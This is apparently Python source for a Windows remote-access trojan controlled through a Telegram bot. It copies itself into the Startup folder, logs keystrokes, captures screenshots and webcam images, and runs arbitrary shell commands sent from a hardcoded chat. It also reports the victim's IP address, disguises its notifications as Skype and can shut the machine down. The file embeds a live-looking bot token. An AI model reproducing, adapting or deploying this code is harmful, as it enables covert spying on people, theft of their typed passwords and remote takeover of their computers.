chat_user_id = 1813084538
######################
#2.4
#mouse!!!!! m.hel
######################
bot_token = '2141768237:AAEJAmf-w5wXxQZsSkrJ1YxrqbtSUwhGURE'
import subprocess
# import sys
import os
import getpass
from ctypes import *


import win32con
import win32console
import win32gui

from time import sleep
#import ctypes
#user32 = ctypes.windll.user32
versi = '2.4'



USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
	if file_path == "":
		file_path = os.path.dirname(os.path.realpath(__file__))
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
		bat_file.write(r'start "" %s' % file_path+
'\n exit')

add_to_startup(__file__)


#import pygame
#import pygame.camera
#from pygame.locals import *

from win10toast import ToastNotifier
import telegram
from telegram import Update
from telegram.ext import CallbackContext, Updater, MessageHandler, Filters
from PIL import Image, ImageGrab
import keyboard
from threading import Thread
from datetime import datetime
import io
import pyttsx3
import winsound
import cv2
import time

import http.client
import psutil

import requests
#import pyautogui 
#import base64


import win32api, win32con
import random 
import time
random.seed()

timescreen = 0



#win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)



log = ''
help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \n m.hel - help mouse command\ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
mkfl = False
#close the programm 
#NEEDS TESTING
def leave():
	sys.exit(1)
	raise SystemExit("done")
	sys.exit(1)

#make screenshot of all desktops
def scr():
	img = ImageGrab.grab(all_screens = True)
	buf = io.BytesIO()
	img.save(buf, format = 'png')
	byte_img = buf.getvalue()
	bot.send_photo(chat_id=chat_user_id, photo=byte_img)

#every message calls this

mset = 10
mtme = 0.3
xmx = 1920
ymx = 1080
mscp = 10
def message_handler(update: Update, context: CallbackContext):
	text = update.message.text

 


	global mkfl
	global timescreen
	global mset
	global mtme
	global xmx
	global ymx
	global mscp
	if not text:
		return
	mas = text.split('\n')		#keys: alt, ctrl, space, enter, delete
	if text[:4] == 'del.' or text[:4] == 'pri.' or text[:4] == 'prs.':
		for elem in mas:
			com = elem[:4]		#command
			par = elem[4:]		#parameter
			if com == "del.":		#del.3 - wait 3 secs
				par = float(par)
				time.sleep(par)
			elif com == "pri.":		#write.string
				keyboard.write(par)
			elif com == 'prs.':		#prs.alt+tab
				keyboard.send(par)
	
	if text[:2] == 'm.':
	# set - кол во циклов defolt 10
	# rnd - запуск рандомайзера
	# tme - задержка между передвижениями defolt 0.3
	# hel - help для команды mouse
	# xmx - максимальное значение х defolt 1920
	# yxm - максимальное значение для y defolt 1080
	# mcl - left click 
	# mcr - right click
	# hid теребоньканье курсора +- 10 пикселей
	# fri - freeze mouse
		helptext = 'm.\n	 rnd - запуск рандомайзера\nfri - freeze mouse\n hid теребоньканье курсора +- 10 пикселей \n mcl - left click \n mcr - right click \n m.par - параметры\nНАСТРОЙКА:\n set - кол во циклов defolt 10\n srp - установить кол во пикселей для тряски\n tme - задержка между передвижениями defolt 0.3\n hel - help для команды mousexmx - максимальное значение х defolt 1920 \n yxm - максимальное значение для y defolt 1080  \n '
		text = text[2:]
		mcom = text[:3]
		text = text[3:]
		if mcom == 'set':
			mset = int(text)
		if mcom == 'tme':
			mtme = float(text)
		if mcom == 'xmx':
			xmx = int(text)
		if mcom == 'ymx':
			ymx = int(text)
		if mcom == 'hel':
				bot.send_message(chat_id=chat_user_id, text=helptext)
		if mcom == 'srp':
				mscp = int(text)
		if mcom == 'rnd':
			for i in range(mset):
				x = random.randint(1, xmx)
				y = random.randint(1, ymx)
				win32api.SetCursorPos((x,y))
				time.sleep(mtme)
		if mcom == 'mcl':
			(x,y)=win32gui.GetCursorPos()
			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
			win32api.mouse_event(win32con.MOUSEEVENTF_UP,x,y,0,0)
		if mcom == 'mcr':
			(x,y)=win32gui.GetCursorPos()
			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN,x,y,0,0)
			time.sleep(0.05)
			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP,x,y,0,0)
		if mcom == 'hid':
			for i in range(mset):
				(x,y)=win32gui.GetCursorPos()
				x = random.randint(x-mscp, x+mscp)
				y = random.randint(y-mscp, y+mscp)				
				win32api.SetCursorPos((x,y))
				time.sleep(mtme)			
		if mcom == 'par':
			mseting='xmx = '+str(xmx)+'\nymx = '+str(ymx)+'\nset = '+str(mset)+'\ntme = '+str(mtme)+'\n srp = '+str(mscp)
			bot.send_message(chat_id=chat_user_id, text=mseting)
		if mcom == "fri":
			(x,y)=win32gui.GetCursorPos()
			for i in range(int(mset)):
				win32api.SetCursorPos((x,y))
				time.sleep(0.0001)
			
		
		
	#text = ' '

	if text == 'help':
		bot.send_message(chat_id=chat_user_id, text=help_text)
	elif text == 'log':            #if log too long, it wont send (needs fix)
		send_log()
	elif text == 'save r':
		os.startfile('C:/Windows/System32/Ribbons.scr')
	elif text == 'save b':
		os.startfile('C:/Windows/System32/Bubbles.scr')
	elif text == 'scr':
		scr()
	elif text == 'done':
		leave()
	elif text == 'err':
		winsound.PlaySound('SystemHand', winsound.SND_ALIAS)
	elif text == 'shut':
		os.system('shutdown /s /t 1')
	elif text[0] == 's':
		speak(text)
	elif text[0] == 'n':
		notification(text)
	elif text == 'cam':
		camera()  
	elif text[0] == 'q':
		system_command(text) 
	elif text[0] == 'w':
		text = text[1:]
		oboi(text)
	elif text == 'update':
		os.system('python C:/Users/Public/Music/update.pyw')   
		bot.send_message(chat_id=chat_user_id, text='start updating')
		leave()
		exit()
	elif text[0] == 'i':
		text=text[1:]
		open_image(text)	
	elif text == 'close':
		keyboard.send('`')
	elif text == '_stop':
			#global mkfl
			if mkfl == True:
				mkfl = False
			else:
				mkfl = True
	elif text[0] == '!':
		text=text[1:]
		text = int(text)
		if text < 5:
			if timescreen > 1:
				bot.send_message(chat_id=chat_user_id, text='Служба автоотправки остановлена!')
				timescreen = 0
			else:
				bot.send_message(chat_id=chat_user_id, text='Команда проигнорирована! \nВремя отправки должно быть больше пяти секунд')
		else:
			timescreen = text
	elif text == '_status':  
		print('ok')    
		cpu = psutil.cpu_times_percent(interval=0.4, percpu=False)
		mem_use=((psutil.virtual_memory().used//1024)/1024)/1024
		mem_total=((psutil.virtual_memory().total//1024)/1024)/1024
        
		conn = http.client.HTTPConnection("ifconfig.me")
		conn.request("GET", "/ip")
		
		status='User: '+USER_NAME+' Os version '+str(subprocess.check_output('ver', shell=True))+' total RAM: '+str(mem_total)+' used: '+str(mem_use)+'ip adress, udp port '+str(conn.getresponse().read())
		bot.send_message(chat_id=chat_user_id, text=str(status) )






	

def open_image(text):
	num = 96
	bat_path = r'C:/Users/Public/Music/image.pyw'
	with open(bat_path, "w+") as bat_file:
			bat_file.write('\nimport cv2'
'\nimport cv2'
'\nimport numpy as np'
'\nimport requests'
'\nurl = r"'+str(text)+'"'
'\nresp = requests.get(url, stream=True).raw'
'\nimage = np.asarray(bytearray(resp.read()), dtype="uint8")'
'\nimage = cv2.imdecode(image, cv2.IMREAD_COLOR)'
'\nwhile 1:'
'\n    cv2.imshow("its end...",image)'
'\n    if cv2.waitKey(0) =='+ str(num)+ ':'
'\n        break'
'\ncv2.destroyAllWindows()')


	bat_path1 = r'C:/Users/Public/Music/image.bat'
	with open(bat_path1, "w+") as bat_file1:
			bat_file1.write('\nimport cv2'
'\n start "" C://Users//Public//Music//image.pyw'
'\n exit'
)
	os.system('"C:/Users/Public/Music/image.bat" && exit')
		
		
		
		
		
def system_command(text):
	text = text[1:]
	#os.system(text)
	direct_output = subprocess.check_output(text, shell=True)
	print(direct_output)
	print(direct_output)
	bot.send_message(chat_id=chat_user_id, text=str(direct_output) )


def oboi(text):
    r = requests.get(text, allow_redirects = True)
    open('C:/Users/Public/Music/dowlfile.jpg', 'wb').write(r.content)
    bat_path = r'C:/Users/Public/Music/oboi.bat'
    with open(bat_path, "w+") as bat_file:
        bat_file.write(r'reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v wallpaper /t REG_SZ /d "" /f '
' \n reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v wallpaper /t REG_SZ /d C:\\Users\\Public\\Music\\dowlfile.jpg /f \n'
' reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f \n'
' RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters \n'
' exit')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    os.system('start C:/Users/Public/Music/oboi.bat')
    

        
'''
	elif text == 'at':
		at() 
def at():
    user32.keybd_event(0x12, 0, 0, 0) #Alt
    sleep(0.5)
    user32.keybd_event(0x09, 0, 0, 0) #Tab
    sleep(0.5)
    user32.keybd_event(0x09, 0, 2, 0) #~Tab
    sleep(0.1)
    user32.keybd_event(0x12, 0, 2, 0) #~Alt
	
	elif text == 'e':
		enter() 
def enter():
    pyautogui.press('enter')

	elif text[0] == 'q':
		system_command(text) 
def system_command(text):
    text = text[1:]
    os.system(text)

	elif text[0] == 'w':
		write_text(text) 
def write_text(text):
    text=text[1:]
    keyboard.write(text)
'''
def camera():
    cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
    retval, image = cap.read()
    image_bytes = cv2.imencode('.jpg', image)[1].tobytes() 
    cap.release()
    bot.send_photo(chat_id=chat_user_id, photo=image_bytes )






        
def notification(text):
	text = text[1:]
	toast = ToastNotifier()
	toast.show_toast("skype",text,duration=20,icon_path="C:\Windows\System32\ComputerToastIcon.png")

def speak(text):
	text = text[1:]
	tts = pyttsx3.init()
	rate = tts.getProperty('rate')
	tts.setProperty('rate', rate)
	volume = tts.getProperty('volume')
	voices = tts.getProperty('voices')
	tts.setProperty('voice', 'ru')
	tts.say(text)
	tts.runAndWait()

def send_log():
	global log
	if log != '':
		#bot.send_message(chat_id=chat_user_id, text=log)
		log = bytes(log, 'utf-8')
		bot.sendDocument(chat_id=chat_user_id, document=log, filename = 'logs.txt')
		log = ''
	else: 
		bot.send_message(chat_id=chat_user_id, text='empty')

def start_key():
	keyboard.on_release(callback=callback)
	keyboard.wait()

diction = {'q':'q (й)', 'w':'w (ц)', 'e':'e (у)', 'r':'r (к)', 't':'t (е)', 'y':'y (н)', 'u':'u (г)', 'i':'i (ш)', 'o':'o (щ)', 'p':'p (з)', '[':'[ (х)', ']':'] (ъ)', 'a':'a (ф)', 's':'s (ы)', 'd':'d (в)', 'f':'f (а)', 'g':'g (п)', 'h':'h (р)', 'j':'j (о)', 'k':'k (л)', 'l':'l (д)', ';':'; (ж)', 'z':'z (я)', 'x':'x (ч)', 'c':'c (с)', 'v':'v (м)', 'b':'b (и)', 'n':'n (т)', 'm':'m (ь)', ',':', (б)', '.':'. (ю)'}
def callback(event):
	global log, diction
	tmp = diction.get(event.name)
	if tmp!=None:
		log += str(datetime.now()) + ' ' + str(tmp) + '\n'
	else:
		log += str(datetime.now()) + ' ' + str(event.name) + '\n'

def mouseandkeyboard():
	global mkfl
'''
	while True:
		global mkfl
		##print(mkfl)
		if mkfl==True:
			windll.user32.BlockInput(True)
			print(mkfl)
		else:
			windll.user32.BlockInput(False)
			print(mkfl)
'''
def autoscreen():
	while True:
		global timescreen
		if timescreen > 0:
		
			scr()
			time.sleep(timescreen)
	
	

bot = telegram.Bot(token=bot_token)
updater = Updater(token = bot_token, use_context = True)
updater.dispatcher.add_handler(MessageHandler(filters = Filters.all, callback = message_handler))
updater.start_polling()

#start keyboard listening
b = Thread(target = start_key)
b.start()
mouseandkeyboard = Thread(target =mouseandkeyboard )
mouseandkeyboard.start()

autoscreen = Thread(target =autoscreen )
autoscreen.start()


conn = http.client.HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")
ipad=conn.getresponse().read()
startmess = 'Larisa version '+versi+' launched by '+USER_NAME+'\n ip adress '+str(ipad)
bot.send_message(chat_id=chat_user_id, text=startmess)
bot.send_message(chat_id=chat_user_id, text=str(__file__))
scr()
updater.idle()
